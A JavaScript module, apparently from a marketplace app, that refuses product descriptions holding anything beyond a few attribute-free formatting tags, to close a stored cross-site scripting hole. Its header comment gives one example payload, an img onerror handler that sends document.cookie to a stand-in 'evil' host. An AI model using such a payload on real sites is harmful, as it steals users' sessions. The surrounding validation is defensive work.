/**
 * What a seller is allowed to put in a description.
 *
 * THE HOLE THIS CLOSES
 *   The product page renders `product.description` with
 *   dangerouslySetInnerHTML and does not sanitise it. So whatever reaches that
 *   field runs in the shopper's browser - a seller could write
 *   `<img src=x onerror="fetch('https://evil/'+document.cookie)">` and steal
 *   the session of everybody who opened their product.
 *
 *   That did not matter while the only person adding products was the owner.
 *   It matters from the day a real third-party seller joins, which is the
 *   marketplace this was decided to be on 7 September 2026.
 *
 * WHY IT REFUSES RATHER THAN CLEANS
 *   A sanitiser is a parser, and hand-written HTML parsers are the classic way
 *   to get this wrong: every bypass ever published is somebody's cleaner
 *   disagreeing with a browser about what a malformed tag means. There is no
 *   safe way to write that from scratch, and adding a library here would mean
 *   an install this project deliberately avoids.
 *
 *   So nothing is cleaned. The allowed tags are removed from the text, and if
 *   ANY angle bracket survives, the description is refused. There is no parser
 *   to disagree with - either the markup is exactly one of a handful of shapes,
 *   or it does not go in the database. The seller is told what they may use.
 *
 * WHY IT LIVES ON THE MODEL AND NOT IN A CONTROLLER
 *   Descriptions are written by the seller controller, the admin controller,
 *   the seed script and the AI drafting script. A check in one of those is a
 *   check three writers walk past. See models/Product.js.
 */

/**
 * Tags a description may contain, and nothing else.
 *
 * No `a` - a link is the thing an attribute check exists to stop, and a
 * description does not need one. No `img` - images have their own field.
 */
const ALLOWED = ['p', 'br', 'ul', 'ol', 'li', 'strong', 'em', 'b', 'i'];

/**
 * Matches an allowed tag carrying NOTHING else: no attributes, no stray
 * characters. `<p>` and `</p>` and `<br/>` match; `<p class="x">` does not,
 * and that is the point - it survives the strip and trips the check below.
 */
const ALLOWED_TAG = new RegExp(`<\\s*/?\\s*(?:${ALLOWED.join('|')})\\s*/?\\s*>`, 'gi');

/**
 * Is this description safe to render as HTML?
 *
 * @param {string} html
 * @returns {{ok: true}|{ok: false, reason: string}}
 */
const checkDescriptionHtml = (html) => {
  const text = String(html ?? '');
  if (!text.trim()) return { ok: true };

  /*
   * Comments first. `<!-- -->` contains no allowed tag, so it would be caught
   * below anyway - but saying so plainly makes the error useful rather than
   * mysterious to a seller who pasted from a word processor.
   */
  if (/<!--/.test(text)) {
    return {
      ok: false,
      reason:
        'Remove the HTML comments from the description. This often happens when text is pasted from Word - paste it as plain text instead.',
    };
  }

  const leftover = text.replace(ALLOWED_TAG, '');

  if (/[<>]/.test(leftover)) {
    /*
     * Name what was found. "Invalid HTML" sends somebody hunting; naming the
     * tag lets them fix it in one go.
     */
    const offender = leftover.match(/<\s*\/?\s*([a-zA-Z0-9-]+)[^>]*>/);

    if (offender) {
      const tag = offender[1].toLowerCase();
      const known = ALLOWED.includes(tag);
      return {
        ok: false,
        reason: known
          ? `Remove the extra parts from the <${tag}> tag. Tags in a description cannot carry attributes such as class, style or onclick.`
          : `The <${tag}> tag is not allowed in a description. You can use paragraphs, bullet lists, bold and italic - nothing else.`,
      };
    }

    return {
      ok: false,
      reason:
        'The description contains a stray < or > character. Write "less than" and "greater than" in words.',
    };
  }

  return { ok: true };
};

/** Convenience for callers that only want a yes or no. */
const isSafeDescriptionHtml = (html) => checkDescriptionHtml(html).ok;

module.exports = { checkDescriptionHtml, isSafeDescriptionHtml, ALLOWED };
